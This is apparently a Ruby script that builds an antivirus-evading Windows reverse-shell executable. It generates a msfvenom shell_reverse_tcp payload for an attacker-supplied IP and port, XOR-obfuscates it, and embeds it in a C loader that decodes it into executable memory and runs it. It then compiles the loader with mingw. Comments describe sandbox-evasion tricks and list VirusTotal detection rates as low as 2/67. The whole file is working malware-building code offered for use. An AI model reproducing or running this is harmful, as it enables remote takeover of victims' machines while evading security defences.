#!/usr/bin/ruby
#encoding:ascii-8bit

usage = 
"This script generates a custom meterpreter reverse tcp executable that is obfuscate with xorKeys and other stuff
USAGE: %s IP PORT
Example: %s 10.0.0.12 443"%[$0, $0]

(ARGV.length != 2) && (puts usage; exit)		#check program arguments, exit if not 2
ip = ARGV[0]
port = ARGV[1]
#xorKey = ARGV[2].to_i(16)				#convert string 0xff or ff to int
#key1, key2, key3 = 0xd6, 0x34, 0x6d
key1, key2, key3 = rand(99), rand(99), rand(99)		#create random 1 byte keys

#puts"%02i"%key1
#puts"%02i"%key2
#puts"%02i"%key3

msfraw = `msfvenom -p windows/shell_reverse_tcp LPORT=#{port} LHOST=#{ip} -f raw`
#msfraw = `msfvenom -p windows/meterpreter/reverse_tcp LPORT=#{port} LHOST=#{ip} -f raw`

xored = ""
msfraw.each_byte{ |b| xored <<"\\x%02x"%[((b ^ key1)^key2)^key3]}	
							#add, xor and sub each byte 
							#back to string shellcode format
#msfraw.each_byte{ |b| bla +="\\x%02x"%b }		#dont use += anymore, its only copy strings not bytes
			#<< modify bothe string, so doesn't mess up encoding
			#pribably whe msf only use << in their code
			#https://stackoverflow.com/questions/29990933/ruby-differences-between-and-to-concatenate-a-string
			#in addition, use "string".bytesize to find shellcode length instead of "string".length
			#heres why
			#"こんにちは世界".each_byte{|b|print"\\x%02x"%b}'
			#"\xe3\x81\x93\xe3\x82\x93\xe3\x81\xab\xe3\x81\xa1\xe3\x81\xaf\xe4\xb8\x96\xe7\x95\x8c"
			#puts "\xe3\x81\x93\xe3\x82\x93\xe3\x81\xab\xe3\x81\xa1\xe3\x81\xaf\xe4\xb8\x96\xe7\x95\x8c".length
			#7
			#puts "\xe3\x81\x93\xe3\x82\x93\xe3\x81\xab\xe3\x81\xa1\xe3\x81\xaf\xe4\xb8\x96\xe7\x95\x8c".bytesize'
			#21
file = "
#define _CRT_SECURE_NO_WARNINGS
#include<windows.h>
#include<stdio.h>

typedef int(WINAPI*FUNC)();				//decribe function pointer windows

int main(int argc, char **argv) {

  if(argc != 2)						//if no key, exit
    exit(0);
  //HWND hwnd = GetConsoleWindow();			//get process window handle
  //ShowWindow(hwnd, SW_HIDE);				//hide window
							//will cause detection ration to go up 12/67
  //void* dummy = malloc(0x1dcd6500);			//allocate 500 MB
  //void* dummy = malloc(0x3b9aca00);			//allocate 1 GB, the offser AVs have to refuse, and USE it
  //void* dummy = malloc(0x59682f00);			//allocate 1.5 GB, the offser AVs have to refuse, and USE it
  //memset(dummy, 0, 0x5000000);			//however, may get attention due to memory consumption
  //if (OpenProcess(PROCESS_ALL_ACCESS, 0, 4)) exit(0);
							//try to open SYSTEM process, if success probably in a sandbox
							//however, this triggers some AV to be malicious for obvious reasons
  FUNC home;						//declare function pointer in windows
  int key1, key3;					//keys to decode shell
  sscanf(argv[1], \"%2i\", &key1);			//scan in first 2 digit from arg
  argv[1] += 2;						//get next 2 digit
  sscanf(argv[1], \"%2i\", &key3);

  unsigned char sleeper[] = \"#{xored}\";		//the encoded shell
  unsigned char* heap;					//target heap with R/W/X
  unsigned char* ptr;					//pointer for target heap write operation
  heap = ptr = VirtualAlloc(0, 0x1000, 0x1000, 0x40);	//use virtualAlloc to enabel page R/W/X 
							//allocate 4096 bytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE
  for(int i = 0; i < sizeof(sleeper);  i++)
    *ptr++ = ((sleeper[i]^key3)^#{key2})^key1;	//xor each byte, and copy them to target
  //int (*func)();					//declare function pointer linux
  home = (FUNC)heap;					//windows way
  home();						//execute windows way, work with getProcAddress
  //func = (int(*)()) heap;				//cast new shell address to function pointer linux
  //free(dummy);					//free dummy memory
  //(int)(*func)();					//execute linux way
    VirtualFree(heap, 0, 0);				//free memory if exit
  return(0);
}"

puts file

comp = "i686-w64-mingw32-gcc ./tmp.c -o ./%s.%s-%02i%02i.exe"%[ip, port, key1, key3]
puts comp
open("./tmp.c", "w"){|f| f.puts file}			#write C code to tmp.c
system(comp)						#compile the file into tmp.exe
puts"cleaning up..."
File.delete("./tmp.c") if File.exist?("./tmp.c")
puts"dont forget to run it like this %s.%s-%02i%02i.exe %02i%02i"%[ip, port, key1, key3, key1, key3]
puts"","*"*80
puts"virustotal 11/10/2018 detection ration: 9/65 (compile with i686-w64-mingw32-gcc)"
puts"virustotal 11/10/2018 detection ration: 2/67 (compile with VS)"

#good reading on recent AV bypass tricks
#Bypass Antivirus Dynamic Analysis
#Limitations of the AV model and how to exploit them
#https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf
#https://blog.rapid7.com/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/